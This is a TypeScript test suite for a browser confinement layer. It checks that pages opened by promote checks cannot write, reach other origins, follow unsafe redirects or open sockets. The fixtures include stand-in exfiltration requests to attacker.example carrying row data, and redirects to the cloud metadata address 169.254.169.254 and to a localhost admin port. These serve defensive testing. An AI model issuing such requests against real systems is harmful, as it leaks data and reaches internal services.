/**
 * What a page the promote checks open may reach, and what is never sent for
 * it: a write, anything to another origin, a redirect's next hop, a socket.
 * Driven through the Playwright seam by a scripted stand-in
 * (`testing/fake-playwright.ts`), which plays a redirect and a socket as
 * Chromium does. What a real Chromium does with the same page:
 * `browser-confine.real.test.ts`.
 */

import { describe, expect, it } from "vitest";
import {
  BASE,
  BEACON,
  deskSent,
  ORIGIN,
  observe,
  STAGING_APP,
  WS
} from "../testing/observed-page.js";

describe("what a checked page reaches", () => {
  it("sends nothing a page asks of another origin, whatever it asks, and records each once", async () => {
    // A build nobody has opened reads the app's data as the checker, then tries to send it away.
    const { chromium, desk, phone } = await observe({
      requests: [
        { method: "POST", url: `${ORIGIN}/api/projects/${WS}/query` },
        { url: "https://attacker.example/?d=rows" },
        { url: "https://attacker.example/?d=rows" },
        { method: "HEAD", url: "https://attacker.example/pixel.gif" },
        { method: "OPTIONS", url: "https://attacker.example/collect" },
        { method: "POST", url: "https://attacker.example/collect", postData: "rows" },
        { url: "https://fonts.example.com/a.woff2" },
        { url: "http://169.254.169.254/latest/meta-data/" },
        BEACON
      ],
      app: STAGING_APP
    });
    // The data read is the app's own, and is answered; nothing else left the app's origin.
    const away = chromium.sent.filter((s) => !s.url.startsWith(ORIGIN));
    expect(away).toHaveLength(14);
    expect(away.map((s) => s.decision)).toEqual(away.map(() => "aborted"));
    const refusedElsewhere = [
      "GET https://attacker.example/?d=rows (another origin)",
      "HEAD https://attacker.example/pixel.gif (another origin)",
      "OPTIONS https://attacker.example/collect (another origin)",
      "POST https://attacker.example/collect (another origin)",
      "GET https://fonts.example.com/a.woff2 (another origin)",
      "GET http://169.254.169.254/latest/meta-data/ (not a public address)"
    ];
    for (const observed of [desk, phone]) {
      expect(observed?.offOrigin).toEqual(refusedElsewhere);
      // Refused, not failed: a page without its font is still a page that came up.
      expect(observed?.refused).toEqual([]);
      expect(observed?.failedRequests).toEqual([]);
      expect(observed?.readyMs).not.toBeNull();
    }
  });

  it("never lets a redirect of a signed request carry the checker to another origin", async () => {
    const elsewhere = "https://cdn.elsewhere.example.net/landed.js";
    const { chromium, desk } = await observe({
      requests: [{ url: `${BASE}assets/moved.js`, redirectTo: elsewhere }, BEACON],
      app: STAGING_APP
    });
    // Nothing went to the other origin at all: the redirect was never handed to the browser.
    const off = chromium.sent.filter((s) => !s.url.startsWith(ORIGIN));
    expect(off).toEqual([]);
    expect(desk?.offOrigin).toEqual([`GET ${elsewhere} (another origin)`]);
    expect(desk?.failedRequests).toEqual([]);
    expect(desk?.readyMs).not.toBeNull();
  });

  it("follows a same-origin redirect of a signed request as the page's own, unsigned", async () => {
    const { chromium } = await observe({
      requests: [{ url: `${BASE}assets/gone.js`, redirectTo: `${ORIGIN}/login?next=x` }, BEACON],
      app: STAGING_APP
    });
    const hop = deskSent(chromium).find((s) => s.url === `${ORIGIN}/login?next=x`);
    expect(hop).toEqual({
      context: 0,
      method: "GET",
      url: `${ORIGIN}/login?next=x`,
      decision: "followed",
      headers: { "user-agent": "fake-chromium" }
    });
  });

  it("names a sign-in redirect of the document, and sends it nothing of the checker's", async () => {
    const here = await observe({ documentRedirectTo: `${ORIGIN}/login?next=x` });
    expect(here.desk?.navigationError).toBe(
      "redirected to /login — the checker's credential was not accepted (a sign-in page)"
    );
    const hops = here.chromium.sent.filter((s) => s.decision === "followed");
    expect(hops).toHaveLength(2);
    for (const hop of hops) expect(hop.headers).toEqual({ "user-agent": "fake-chromium" });
  });

  it("does not follow the document to another origin, and says that is where it was sent", async () => {
    const sso = "https://sso.example.net/customer-apps/acme/store/";
    const { chromium, desk } = await observe({ documentRedirectTo: sso });
    // Another origin is off the app even on the same path, and nothing is sent to it.
    expect(chromium.sent.filter((s) => !s.url.startsWith(ORIGIN))).toEqual([]);
    expect(desk?.navigationError).toBe(
      `redirected off the app's origin — the checker's credential was not accepted (a sign-in page); not sent: GET ${sso} (another origin)`
    );
    expect(desk?.offOrigin).toEqual([`GET ${sso} (another origin)`]);
  });

  it("refuses a redirect of a signed request that leads where the check would not go", async () => {
    const { chromium, desk } = await observe({
      requests: [
        { url: `${BASE}assets/meta.js`, redirectTo: "http://169.254.169.254/latest/meta-data/" },
        { ...BEACON, status: 307, redirectTo: `${ORIGIN}/api/orgs` }
      ],
      app: STAGING_APP
    });
    // Neither redirect was handed to the browser to follow.
    const answers = deskSent(chromium).slice(1);
    expect(answers.map((s) => [s.url, s.decision])).toEqual([
      [`${BASE}assets/meta.js`, "aborted"],
      [`${BASE}__oxy/beacon`, "aborted"]
    ]);
    expect(desk?.offOrigin).toEqual([
      "GET http://169.254.169.254/latest/meta-data/ (not a public address)"
    ]);
    expect(desk?.refused).toEqual(["POST /api/orgs"]);
  });

  it("judges the next hop of a redirect of a request it passes, as it does a signed one's", async () => {
    // A read the check passes answers a redirect: to the metadata address, to this machine, away.
    const { chromium, desk } = await observe({
      requests: [
        { url: `${ORIGIN}/api/orgs`, redirectTo: "http://169.254.169.254/latest/meta-data/" },
        { url: `${ORIGIN}/api/me`, redirectTo: "http://127.0.0.1:9000/admin" },
        { url: `${ORIGIN}/api/out`, status: 307, redirectTo: "https://attacker.example/?d=rows" },
        BEACON
      ],
      app: STAGING_APP
    });
    // No hop was followed by anyone: each redirect was read here, with redirects off, and the
    // request failed in the browser instead of being handed over.
    expect(chromium.sent.filter((s) => s.decision === "followed")).toEqual([]);
    expect(chromium.sent.filter((s) => !s.url.startsWith(ORIGIN))).toEqual([]);
    expect(
      deskSent(chromium)
        .slice(1, 4)
        .map((s) => [s.url, s.decision, s.maxRedirects])
    ).toEqual([
      [`${ORIGIN}/api/orgs`, "aborted", 0],
      [`${ORIGIN}/api/me`, "aborted", 0],
      [`${ORIGIN}/api/out`, "aborted", 0]
    ]);
    expect(desk?.offOrigin).toEqual([
      "GET http://169.254.169.254/latest/meta-data/ (not a public address)",
      "GET http://127.0.0.1:9000/admin (not a public address)",
      "GET https://attacker.example/?d=rows (another origin)"
    ]);
    expect(desk?.readyMs).not.toBeNull();
  });

  it("hands the browser a redirect to follow only when its next hop is a read", async () => {
    // The browser follows what it is handed, and whatever that answers, without asking again.
    // A read stays a read on every hop; a write that is redirected is not sent on.
    const query = `${ORIGIN}/api/projects/${WS}/query`;
    const { chromium, desk } = await observe({
      requests: [
        { method: "POST", url: query, status: 307, redirectTo: `${query}?again` },
        { ...BEACON, status: 308, redirectTo: `${BASE}__oxy/beacon` },
        { url: `${ORIGIN}/api/orgs`, redirectTo: `${ORIGIN}/api/orgs/` },
        BEACON
      ],
      app: STAGING_APP
    });
    expect(chromium.sent.filter((s) => s.context === 0 && s.decision === "followed")).toEqual([
      {
        context: 0,
        method: "GET",
        url: `${ORIGIN}/api/orgs/`,
        decision: "followed",
        headers: { "user-agent": "fake-chromium" }
      }
    ]);
    expect(desk?.refused).toEqual([
      `POST /api/projects/${WS}/query`,
      "POST /customer-apps/acme/store/__oxy/beacon"
    ]);
  });

  it("opens no socket a page asks for, on any origin, and records each", async () => {
    const sockets = [
      "ws://127.0.0.1:9000/devtools",
      "wss://attacker.example/live?d=rows",
      "wss://app.example.com/api/live",
      "wss://app.example.com:8443/api/live"
    ];
    const { chromium, desk } = await observe({ requests: [BEACON], sockets, app: STAGING_APP });
    expect(chromium.sockets.filter((s) => s.context === 0)).toEqual(
      sockets.map((url) => ({ context: 0, url, decision: "closed" }))
    );
    expect(desk?.offOrigin).toEqual([
      "WS ws://127.0.0.1:9000/devtools (not a public address)",
      "WS wss://attacker.example/live?d=rows (another origin)",
      "WS wss://app.example.com:8443/api/live (another origin)"
    ]);
    // On the app's own origin too: a socket is a channel both ways, and the checker opens none.
    expect(desk?.refused).toEqual(["WS /api/live"]);
    expect(desk?.readyMs).not.toBeNull();
  });

  it("never sends a write the page attempts, and records it once", async () => {
    const { chromium, desk } = await observe({
      requests: [
        { method: "POST", url: `${BASE}fn/save` },
        { method: "POST", url: `${BASE}fn/save` },
        { method: "POST", url: "https://sentry.example.com/api/1/envelope/" },
        BEACON
      ],
      app: STAGING_APP
    });
    const writes = chromium.sent.filter((s) => s.context === 0 && !s.url.endsWith("beacon"));
    expect(writes.slice(1).map((s) => s.decision)).toEqual(["aborted", "aborted", "aborted"]);
    expect(desk?.refused).toEqual(["POST /customer-apps/acme/store/fn/save"]);
    // A write to another origin is refused for where it goes, like a read to it.
    expect(desk?.offOrigin).toEqual([
      "POST https://sentry.example.com/api/1/envelope/ (another origin)"
    ]);
    // A refused write is not also a failed request, and the page is still ready.
    expect(desk?.failedRequests).toEqual([]);
    expect(desk?.readyMs).not.toBeNull();
  });
});
